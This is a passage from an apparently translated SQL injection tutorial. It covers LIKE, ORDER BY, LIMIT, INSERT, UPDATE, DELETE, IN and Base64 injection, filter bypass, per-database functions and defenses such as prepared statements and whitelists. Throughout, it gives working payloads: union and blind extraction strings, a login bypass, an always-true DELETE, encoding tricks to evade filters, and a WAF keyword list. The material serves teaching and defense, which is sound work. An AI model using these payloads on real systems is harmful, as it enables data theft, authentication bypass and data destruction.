Its special point is that the injection point is usually wrapped in `%...%`, with both string quotes and LIKE wildcards, so the closure method differs slightly from ordinary character-based injection.

#### Requirements

- **Search keywords are directly concatenated into LIKE statements**.
- **Quotes and `%` wildcards exist around the keyword**.
- **The backend does not parameterize LIKE special characters and SQL structure**.
- **Search results, errors, or response differences are observable**.

#### Underlying Data Flow

```text
Search term -> concatenated into like '%input%' -> close string/wildcard -> append SQL condition -> search semantics are rewritten
```

#### Common Misconception

`%` and `_` in LIKE are database wildcards, not security filters. Even if developers only implement "fuzzy search", incorrect string concatenation can still become SQL injection.


Common search function writing style:

```sql
select * from articles
where title like '%$keyword%'
```

Normal search:

```text
keyword=security
```

Actual SQL:

```sql
select * from articles
where title like '%security%'
```

---

### 14.2 Search-Box Injection

Input:

```text
%' union select 1,database(),3 --+
```

Actual SQL:

```sql
select * from articles
where title like '%%'
union select 1,database(),3 --+%'
```

---

### 14.3 LIKE Boolean Blind Injection

```http
?keyword=%' and ascii(substr(database(),1,1))=115 --+
```

Actual SQL:

```sql
select * from articles
where title like '%%'
and ascii(substr(database(),1,1))=115 --+%'
```

---

## 15. ORDER BY Injection

### 15.1 Core Definition

#### Plain-language Explanation

The special point of ORDER BY injection is: **the sort field is usually not an ordinary value, but part of the SQL structure.**

For example, in `order by create_time desc`, `create_time` and `desc` cannot simply be bound as parameters like ordinary strings. If a developer directly concatenates user-provided `sort`, an attacker may insert expressions, conditional judgments, error functions, or delay functions.

#### Requirements

- **The sort field or sort direction is controlled by the user**.
- **The backend directly concatenates it after `order by`**.
- **No field whitelist exists**.
- **The database allows expressions or functions in the sort position**.

#### Underlying Data Flow

```text
sort parameter -> concatenated into order by structural position -> database sorts/calculates using attacker expression -> infer result through errors or response differences
```

#### Common Misconception

ORDER BY positions cannot be solved merely by "putting the parameter in quotes". The correct approach is whitelist mapping: the user can only choose business enumerations such as `time`, `price`, or `id`, and the server maps them to fixed SQL fragments.


Some systems allow users to control sort fields:

```http
?sort=id
?sort=create_time
```

Backend code:

```sql
select * from users order by $sort
```

If `$sort` has no whitelist validation, ORDER BY injection may occur.

---

### 15.2 Characteristics of ORDER BY Injection

After `order by`, ordinary `union` usually cannot be used directly, but conditional expressions, error-based methods, or time-based checks can be used.

---

### 15.3 ORDER BY Time Blind Injection Example

```http
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),id)
```

Actual SQL:

```sql
select * from users
order by if(ascii(substr(database(),1,1))=115,sleep(5),id)
```

If it delays, the first character of the database name is `s`.

---

### 15.4 Defense Key

Sort fields must use a whitelist:

```php
$allow = ['id','create_time','username'];

if (!in_array($sort, $allow)) {
    $sort = 'id';
}
```

Escaping alone is not enough.

---

## 16. LIMIT Injection

### 16.1 Common Pagination SQL

#### Plain-language Explanation

LIMIT injection occurs at pagination positions. Many systems directly concatenate `page`, `size`, and `offset` into `limit offset,size`. These positions look like just numbers, but if they are not forcibly converted to integers, extra SQL fragments may be inserted.

Its exploitation differs from ordinary string injection because the position after LIMIT is usually not inside quotes, but in numeric syntax.

#### Requirements

- **Pagination parameters are controlled by the user**.
- **Parameters are not converted to integers and range-limited**.
- **Database syntax allows expressions or subsequent clauses to be spliced into LIMIT-related positions**.
- **Page responses, errors, or timing differences are observable**.

#### Underlying Data Flow

```text
Pagination parameter -> concatenated into limit/offset -> numeric syntax is rewritten -> database executes abnormal pagination semantics
```

#### Common Misconception

"This is a number, so there will be no injection" is a typical misjudgment. Numeric positions are still SQL syntax; as long as string concatenation is uncontrolled, the query structure may be changed.


```sql
select * from articles
limit $offset,$size
```

Normal parameters:

```http
?page=1&size=10
```

Actual SQL:

```sql
select * from articles limit 0,10
```

---

### 16.2 LIMIT Injection Example

If the backend directly concatenates:

```http
?offset=0&size=10 union select 1,database(),3
```

it may form:

```sql
select * from articles
limit 0,10 union select 1,database(),3
```

However, in MySQL, the LIMIT position has many syntax restrictions. In real-world exploitation, it is more often combined with errors, the old `procedure analyse` feature, or other syntax points.

---

### 16.3 Pagination Parameter Defense

Pagination parameters must be converted to integers:

```php
$page = intval($_GET['page']);
$size = intval($_GET['size']);
```

Also limit the range:

```php
if ($size > 100) {
    $size = 100;
}
```

---

## 17. INSERT Injection

### 17.1 Core Definition

#### Plain-language Explanation

INSERT injection occurs when adding data. Content submitted by the attacker should have been written into a table as one field value, but if it is directly concatenated into `insert into ... values (...)`, it may close the current value, insert extra expressions, or even affect subsequent fields.

This kind of injection is not necessarily aimed at "querying data"; it may also create abnormal data, trigger errors, or write second-order injection payloads.

#### Requirements

- **Fields in add/create forms are directly concatenated into INSERT statements**.
- **Field values do not use parameter binding**.
- **Database errors, write results, or subsequent business behavior are observable**.
- **The database account has write permissions**.

#### Underlying Data Flow

```text
Submit new field -> concatenate into values(...) -> close field value -> rewrite insert semantics -> error/write/second-order trigger
```

#### Common Misconception

INSERT injection is not limited to "writing junk data". As long as written data is later queried, displayed, or concatenated into SQL again, it may become the starting point for second-order injection, stored attacks, or permission bypass.


INSERT injection occurs when adding data, such as registration, comments, and log recording.

Backend SQL:

```sql
insert into messages(username,content)
values('$username','$content')
```

---

### 17.2 INSERT Error-Based Injection

Input content:

```text
content=test' or updatexml(1,concat(0x7e,database()),1) or '
```

Actual SQL may become:

```sql
insert into messages(username,content)
values('tom','test' or updatexml(1,concat(0x7e,database()),1) or '')
```

---

### 17.3 Characteristics of INSERT Injection

INSERT injection may not have direct page output, but it can be indirectly verified through:

- Error information
- Log pages
- Backend review pages
- Second reads
- Time delays

---

## 18. UPDATE Injection

### 18.1 Typical Business SQL

#### Plain-language Explanation

UPDATE injection occurs when modifying data, such as changing a nickname, email, password, or shipping address. Its danger is that: **the SQL itself is a write operation; once the WHERE condition or SET fields are rewritten, the impact may directly affect real data.**

For example, a user should only modify their own nickname. If injection changes the WHERE condition, it may affect many more user records.

#### Requirements

- **Modification API fields are controllable**.
- **SET values or WHERE conditions are directly concatenated into SQL**.
- **No parameterization or permission boundary checks exist**.
- **The database account has update permissions**.

#### Underlying Data Flow

```text
Submit modification parameter -> concatenate into update set/where -> rewrite field values or condition range -> data is modified abnormally
```

#### Common Misconception

UPDATE injection is not only about "whether the database can be dumped"; it also involves data integrity. During defense, besides parameterization, database account permissions should be restricted, and the business layer should ensure only the current subject's data can be modified.


Modify personal profile:

```sql
update users
set nickname='$nickname'
where id='$id'
```

---

### 18.2 UPDATE Injection Example

Input nickname:

```text
test',email=database() where id=1 --+
```

Actual SQL:

```sql
update users
set nickname='test',email=database() where id=1 --+'
where id='2'
```

The result may cause the user's email field to be changed to the current database name.

---

### 18.3 UPDATE Time Blind Injection

```text
nickname=test' where id=1 and if(length(database())=8,sleep(5),0) --+
```

Actual SQL:

```sql
update users
set nickname='test'
where id=1 and if(length(database())=8,sleep(5),0) --+'
where id='2'
```

---

## 19. DELETE Injection

### 19.1 Typical Business SQL

#### Plain-language Explanation

DELETE injection occurs in delete operations. Normal SQL may be `delete from message where id=user_input and uid=current_user`. If `id` is concatenated, an attacker may rewrite the WHERE condition and expand the deletion range.

This kind of injection is usually more dangerous than query-style injection because it can directly destroy data.

#### Requirements

- **The delete ID or condition field is controlled by the user**.
- **The WHERE condition is directly concatenated into SQL**.
- **There is no forced integer conversion, parameterization, or ownership check**.
- **The database account has delete permissions**.

#### Underlying Data Flow

```text
Delete parameter -> concatenate into delete where -> rewrite delete condition -> deletion range expands or unauthorized data is deleted
```

#### Common Misconception

DELETE APIs cannot be relaxed just because they "do not display data". Their main risk is not data exfiltration, but data destruction, unauthorized deletion, and business irrecoverability.


Delete article:

```sql
delete from articles where id='$id'
```

---

### 19.2 DELETE Injection Example

```http
?id=1' or '1'='1
```

Actual SQL:

```sql
delete from articles where id='1' or '1'='1'
```

Without permission checks and transaction protection, this may delete the entire table.

---

### 19.3 Impact of DELETE Injection

DELETE injection is more dangerous than SELECT injection because it directly affects data integrity:

```text
Query injection -> leaks data
Delete injection -> destroys data
Update injection -> tampers with data
```

---

## 20. IN-Parameter Injection

### 20.1 Typical Business Scenario

#### Plain-language Explanation

IN-parameter injection is common in batch queries or batch operations, such as `where id in (1,2,3)`. Developers often directly join ID lists sent by the frontend into a comma-separated string. Once an attacker can close the parentheses, they can append their own SQL logic.

It looks like "multiple numbers", but the whole value is still part of the SQL structure.

#### Requirements

- **The frontend can pass multiple IDs or enum values**.
- **The backend directly concatenates a comma-separated list**.
- **There is no per-item type validation and per-item parameter binding**.
- **Query results, errors, or response differences are observable**.

#### Underlying Data Flow

```text
ID list -> concatenated into in (...) -> close parenthesis/append condition -> original filtering range is rewritten
```

#### Common Misconception

IN parameters cannot be handled just by checking "whether the string contains commas". The correct approach is to split the list, convert each item into an integer or legal enum, and then generate an independent placeholder for each item.


Batch query:

```http
?id=1,2,3
```

Backend SQL:

```sql
select * from users where id in ($ids)
```

---

### 20.2 IN Injection Example

Malicious parameter:

```http
?id=1,2,3) union select 1,database(),3 --+
```

Actual SQL:

```sql
select * from users
where id in (1,2,3)
union select 1,database(),3 --+)
```

---

### 20.3 IN Parameter Defense

Do not directly concatenate strings. Split the list and convert each item to an integer:

```php
$ids = explode(',', $_GET['id']);
$ids = array_map('intval', $ids);
$sql = "select * from users where id in (" . implode(',', $ids) . ")";
```

A better way is to use prepared placeholders.

---

## 21. Base64-Encoded Injection

### 21.1 Core Definition

#### Plain-language Explanation

The key point of Base64-encoded injection is: **Base64 is not encryption or a security control; it only changes the representation of the original string.**

If the backend first Base64-decodes a parameter and then concatenates the decoded content into SQL, the attacker only needs to Base64-encode the injection statement before submitting it. The vulnerability still exists.

#### Requirements

- **Parameters are transmitted after Base64 encoding**.
- **The server decodes them and uses the original content**.
- **The decoded content is directly concatenated into SQL**.
- **No parameterized query or semantic validation exists**.

#### Underlying Data Flow

```text
Base64 parameter -> server decodes -> obtains malicious SQL fragment -> concatenates into SQL -> injection triggers
```

#### Common Misconception

Encoding can only change the transmission form; it cannot change security properties. As long as the decoded content comes from the user, it must be treated as untrusted input.


Some systems Base64-encode parameters, which makes them look unlike ordinary SQL injection, but the backend still concatenates SQL after decoding.

Request:

```http
?id=MQ==
```

Where:

```text
MQ== decodes to 1
```

---

### 21.2 Base64 Injection Example

Original payload:

```text
1' and updatexml(1,concat(0x7e,database()),1) --+
```

Transmitted after Base64:

```text
MScgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCkpLDEpIC0tKw==
```

After backend decoding, SQL is concatenated as:

```sql
select * from users
where id='1'
and updatexml(1,concat(0x7e,database()),1) --+'
```

---

### 21.3 Essence

```text
Encoding is not a security measure
As long as decoded content continues to be concatenated into SQL, injection still exists
```

---

## 22. Basic Ideas for Filter Bypass

### 22.1 Case Bypass

#### First Understand the Essence of Filter Bypass

Filter bypass is not an independent vulnerability, but the confrontation process of SQL injection when protection is incomplete. Many systems only block certain keywords, such as `union`, `select`, spaces, or single quotes. Attackers then use case changes, comments, encoding, equivalent functions, whitespace substitutions, and other methods so the database can still parse the original SQL semantics.

The most important point is: **blacklist filtering is always chasing the tail of database syntax**. Database parsers can recognize many forms, and application-layer replacement of a few strings is hard to make complete.

#### Underlying Data Flow

```text
Attack input -> simple filter replaces/blocks some keywords -> remaining content can still be parsed by database -> SQL semantics are rewritten
```

#### Defense Focus

The correct defense against filter bypass is not to keep stacking blacklists, but to return to the root causes: parameterized queries, whitelist enums, type enforcement, least privilege, and unified error handling.


The filter only blocks lowercase `union`:

```sql
UNION SELECT
UnIoN SeLeCt
```

---

### 22.2 Comment Bypass

```sql
union/**/select
uni/**/on sel/**/ect
```

---

### 22.3 Encoding Bypass

```sql
0x61646d696e
```

Equivalent to:

```text
admin
```

For example:

```sql
where username=0x61646d696e
```

---

### 22.4 Space Bypass

If spaces are filtered:

```sql
union/**/select
union%0aselect
union%09select
```

Common whitespace characters:

```text
%20 space
%09 Tab
%0a newline
%0b vertical tab
%0c form feed
%0d carriage return
```

---

### 22.5 `and`/`or` Filter Bypass

```sql
and -> &&
or  -> ||
```

Example:

```http
?id=1' && '1'='1' --+
```

---

### 22.6 Equal-Sign Filter Bypass

```sql
=       -> like
=       -> regexp
=       -> between
```

Example:

```sql
substr(database(),1,1) like 's'
ascii(substr(database(),1,1)) between 115 and 115
```

---

## 23. Injection Differences Across Databases

### 23.1 MySQL

Common functions:

```sql
database()
version()
user()
sleep()
updatexml()
extractvalue()
group_concat()
information_schema
```

---

### 23.2 SQL Server

Common functions and tables:

```sql
db_name()
@@version
system_user
waitfor delay '0:0:5'
sys.databases
sys.tables
sys.columns
```

Time blind injection example:

```sql
'; if db_name()='test' waitfor delay '0:0:5' -- 
```

---

### 23.3 Oracle

Common objects:

```sql
dual
user_tables
user_tab_columns
```

Common query:

```sql
select user from dual
```

Common time-delay method:

```sql
dbms_lock.sleep(5)
```

---

### 23.4 PostgreSQL

Common functions:

```sql
current_database()
version()
current_user
pg_sleep(5)
information_schema.tables
information_schema.columns
```

Time blind injection:

```sql
' and case when current_database()='test' then pg_sleep(5) else pg_sleep(0) end--
```

---

## 24. Complete SQL Injection Attack Flow

### 24.1 Manual Testing Flow

```text
1. Find parameters
2. Determine whether injection exists
3. Determine injection type
4. Determine closure method
5. Determine the number of fields
6. Determine display positions
7. Obtain database name
8. Obtain table names
9. Obtain field names
10. Obtain target data
11. Verify permission boundaries
12. Output vulnerability report
```

---

### 24.2 Union Injection Flow

```text
?id=1'
        ↓
Determine character-based type
        ↓
?id=1' order by 3 --+
        ↓
Determine number of fields
        ↓
?id=-1' union select 1,2,3 --+
        ↓
Determine display positions
        ↓
?id=-1' union select 1,database(),version() --+
        ↓
Obtain database information
```

---

### 24.3 Blind Injection Flow

```text
?id=1' and 1=1 --+
?id=1' and 1=2 --+
        ↓
Confirm true/false difference
        ↓
length(database())=?
        ↓
ascii(substr(database(),n,1))=?
        ↓
Restore data character by character
```

---

### 24.4 Time Blind Injection Flow

```text
?id=1' and if(1=1,sleep(5),0) --+
?id=1' and if(1=2,sleep(5),0) --+
        ↓
Confirm delay difference
        ↓
if(length(database())=8,sleep(5),0)
        ↓
if(ascii(substr(database(),1,1))=115,sleep(5),0)
        ↓
Restore data character by character
```

---

## 25. Summary of Real Business Scenario Statements

### 25.1 User Detail Page

Business URL:

```http
/user.php?id=1
```

Backend SQL:

```sql
select * from users where id='$id'
```

Test statements:

```http
?id=1'
?id=1' and '1'='1' --+
?id=1' and '1'='2' --+
```

Union exploitation:

```http
?id=-1' union select 1,database(),version() --+
```

---

### 25.2 Login API

Business SQL:

```sql
select * from users
where username='$username'
and password='$password'
```

Bypass statement:

```text
username=admin' --+
password=anything
```

Actual SQL:

```sql
select * from users
where username='admin' --+'
and password='anything'
```

---

### 25.3 Search API

Business SQL:

```sql
select * from goods
where name like '%$keyword%'
```

Test statements:

```http
?keyword=%'
?keyword=%' and '1'='1' --+
?keyword=%' and '1'='2' --+
```

Union statement:

```http
?keyword=%' union select 1,database(),3 --+
```

---

### 25.4 Sorting API

Business SQL:

```sql
select * from orders order by $sort
```

Test statements:

```http
?sort=id
?sort=if(1=1,id,create_time)
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),id)
```

---

### 25.5 Cookie User Identification

Business SQL:

```sql
select * from users where uid='$uid'
```

Cookie:

```http
Cookie: uid=1' and updatexml(1,concat(0x7e,database()),1) --+
```

---

### 25.6 Log Recording Function

Business SQL:

```sql
insert into login_log(ip,user_agent)
values('$ip','$ua')
```

Request header:

```http
User-Agent: test' or updatexml(1,concat(0x7e,database()),1) or '
```

---

### 25.7 Batch Delete API

Business SQL:

```sql
delete from articles where id in ($ids)
```

Test parameter:

```http
?ids=1,2,3)
```

Further test:

```http
?ids=1,2,3) union select 1,database(),3 --+
```

---

## 26. SQL Injection Defense Solutions

### 26.1 Prepared Statements

The core defense method:

```php
$stmt = $pdo->prepare("select * from users where id = ?");
$stmt->execute([$id]);
```

The core role of prepared statements is:

```text
SQL structure is determined first
User input is only data
It will not be interpreted as SQL code again
```

---

### 26.2 Disable Error Display

Production environments must not display raw database errors.

Error examples:

```text
You have an error in your SQL syntax near ...
XPATH syntax error: ...
```

They should be changed to a unified prompt:

```text
The system is busy. Please try again later.
```

Detailed errors should only be written to server-side logs.

---

### 26.3 Input Whitelists

Especially suitable for:

- Sort fields
- Sort directions
- Pagination parameters
- Table names
- Field names
- Status enums

Example:

```php
$allowSort = ['id','create_time','username'];

if (!in_array($sort, $allowSort)) {
    $sort = 'id';
}
```

---

### 26.4 Type Coercion

Numeric parameters must be converted to integers:

```php
$id = intval($_GET['id']);
```

Pagination parameters:

```php
$page = max(1, intval($_GET['page']));
$size = min(100, intval($_GET['size']));
```

---

### 26.5 Principle of Least Privilege

Business database accounts should not use:

```text
root
DBA
High-privilege accounts
```

Ordinary business accounts should only receive necessary permissions:

```sql
select
insert
update
delete
```

Avoid granting:

```sql
file
super
grant
drop
create user
```

---

### 26.6 WAF and Log Monitoring

High-risk keywords can be monitored:

```text
union select
information_schema
sleep(
benchmark(
updatexml(
extractvalue(
or 1=1
```

However, WAFs can only be auxiliary and cannot replace prepared statements.

---

### 26.7 Second-Order Injection Defense

The key defense point for second-order injection:

```text
Filtering before database insertion is not enough
When data is used again after being read back, it must also be parameterized
```

Incorrect writing style:

```php
$sql = "update users set password='$pass' where username='$username'";
```

Correct writing style:

```php
$stmt = $pdo->prepare("update users set password=? where username=?");
$stmt->execute([$pass, $username]);
```

---

### 26.8 Wide-Byte Injection Defense

The character set must be unified:

```sql
set names utf8mb4
```

And ensure:

```text
Page encoding
PHP connection encoding
Database table encoding
Database connection encoding
```

are all consistent.

Do not rely on:

```php
addslashes()
mysql_real_escape_string()
```

The core is still prepared statements.

---

## 27. Full-Text Summary

SQL injection can be understood with this mnemonic:

```text
If input is controllable, check concatenation;
If the page has output, use Union;
If the page reports errors, use error-based injection;
If the page has no output, check true/false;
If true/false is unclear, check time;
Stored first and used later means second-order;
Encoding mismatch means wide-byte;
Multiple statements mean stacked queries;
Sorting and pagination rely on whitelists;
All input must ultimately be parameterized.
```



The essence of SQL injection:

```text
User input is concatenated into SQL
causing data to become code
and attackers to change database execution logic
```

Core differences between injection techniques:

| Injection Type       | Exploitation condition                   | Data acquisition method             |
| -------------------- | ---------------------------------------- | ----------------------------------- |
| Union injection      | The page has a display position          | Directly display query results      |
| Error-based injection | The page displays database errors       | Error messages carry data           |
| Boolean blind injection | Page true/false states differ         | Judge true/false bit by bit         |
| Time blind injection | The page has no obvious difference       | Judge through delay                 |
| Second-order injection | Malicious data is stored first, then triggered | Second concatenation execution |
| Wide-byte injection  | GBK and other wide-byte environments     | Eat the escaping backslash          |
| Stacked injection    | Multi-statement execution is supported   | Execute multiple SQL statements at once |
| Header injection     | Request headers are stored or queried    | Indirect trigger                    |
| Cookie injection     | Cookies participate in SQL               | Trigger by modifying Cookies        |
| POST injection       | POST parameters are concatenated into SQL | Trigger through request body        |

Final mnemonic:

```text
If output exists, use Union;
If errors exist, use error-based injection;
No output, check boolean;
No difference, check time;
Data stored first and used later is second-order;
GBK eats backslashes, that is wide-byte;
Semicolon multi-statements are stacked queries;
The fundamental defense is prepared statements.
```

The core defense against SQL injection is one sentence:

```text
Never concatenate user input into SQL statements.
```

The truly safe writing style is:

```text
Parameterized queries + least privilege + hidden errors + whitelist validation + log monitoring
```
